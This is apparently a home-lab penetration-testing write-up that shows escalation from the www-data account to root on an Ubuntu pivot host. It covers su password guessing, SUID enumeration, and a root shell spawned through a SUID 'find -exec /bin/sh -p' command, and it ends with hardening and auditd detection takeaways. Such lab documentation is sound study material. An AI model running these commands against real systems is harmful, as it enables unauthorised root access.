# Part 3: Privilege Escalation

*MITRE ATT&CK: T1548 Abuse Elevation Control Mechanism*

**Goal:** Escalate from `www-data` (the web server's low-privilege account) to `root` on the Ubuntu pivot host. Root access is needed to configure the SSH tunnel in Part 4 and plant the key that allows SSH into and through Ubuntu.

---

## Starting Position

- Shell as: `www-data`
- Host: Ubuntu (`192.168.100.20` / `192.168.200.20`)
- Goal: `root`

---

## Enumeration

Manual enumeration from the www-data shell:

```bash
# Attempt lateral movement to dvwa user via password guessing
su dvwa   # tried: password, letmein, abc123, charley — all failed

# Check container escape (LXD)
lxd --version
lxc list

# Find SUID binaries — run as any user, executes as file owner (root)
find / -perm -4000 -type f 2>/dev/null
```

**Key findings:**

```
# su dvwa attempts — all returned: Authentication failure

# LXD:
# Unable to trigger the installation of the LXD snap.
# Please make sure you're a member of the 'lxd' system group.

# SUID binary found:
/usr/bin/find
```

---

## Exploitation

**Vector:** SUID `find` binary.

`find` has the Set User ID bit set, meaning it executes as the file's owner (root) regardless of who runs it. The `-exec` flag lets you run arbitrary commands within `find`, inheriting that root privilege. The `-p` flag on `/bin/sh` preserves the root UID instead of dropping back to the calling user.

In plain terms: there is a program (`find`) that has been misconfigured to always run with root-level privileges, no matter which user on the system runs it. By telling `find` to open a shell with its `-exec` flag, that shell inherits root access.

```bash
# Confirm find has SUID
find / -perm -4000 -type f 2>/dev/null | grep find
# /usr/bin/find

# Exploit: use find's -exec to spawn a root shell
find . -exec /bin/sh -p \; -quit
```

**Confirmed root:**
```bash
# whoami
root
```

![SUID find exploitation — www-data to root via `find . -exec /bin/sh -p \; -quit`](../screenshots/phase3-suid-privesc.png)

---

## Key Takeaways

- **SUID binaries are dangerous when they support arbitrary command execution.** `find`, `vim`, `python`, `perl`, and dozens of others can be abused if the SUID bit is set. [GTFOBins](https://gtfobins.github.io) documents every known vector.
- **www-data gets SUID access the same as any user.** SUID does not check the caller's identity: it always runs as the file's owner. This is why minimizing SUID binaries is a hardening baseline.
- **Failed `su` attempts create noise.** Even when password guessing fails, the attempts are logged in auth.log. Useful for alerting on compromised service accounts attempting lateral movement.
- **SUID abuse requires process-level auditing to detect.** Standard syslog does not record every command executed in a shell session. Without auditd rules watching specifically for `find -exec /bin/sh`, this escalation produces no log entry that a SIEM could alert on. Auditd deployment is covered in [Detection Engineering](../blue-team/detection-engineering.md).

---

[Part 2: Initial Access](part2-initial-access.md) | Next: [Part 4: Lateral Movement](part4-lateral-movement.md)
